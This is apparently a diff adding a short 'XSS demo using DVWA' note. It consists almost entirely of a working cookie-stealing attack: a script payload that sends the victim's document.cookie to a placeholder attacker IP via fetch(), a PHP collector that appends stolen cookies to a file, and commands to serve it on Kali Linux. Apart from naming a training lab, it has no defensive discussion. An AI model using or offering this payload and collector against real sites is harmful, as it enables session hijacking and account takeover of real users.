@@ -1,0 +1,26 @@
+XSS demo using DVWA
+
+Code to be executed inside victim browser using XSS
+<script>
+  fetch('http://ATTACKER_SERVER_IP/stealer.php?cookie=' + encodeURIComponent(document.cookie));
+</script>
+
+
+  The following code to be executed on hacker machine
+
+<?php
+if (isset($_GET['cookie'])) {
+    $cookie = $_GET['cookie'];
+    $file = fopen('stolen_cookies.txt', 'a');
+    fwrite($file, "Stolen Cookie: " . $cookie . "\n[" . date('Y-m-d H:i:s') . "]\n\n");
+    fclose($file);
+}
+?>
+
+To install above code on Kali Linux
+sudo apt update
+sudo apt install php -y
+
+  Go to the directory where this code is stored and run.
+
+php -S 0.0.0.0:8000
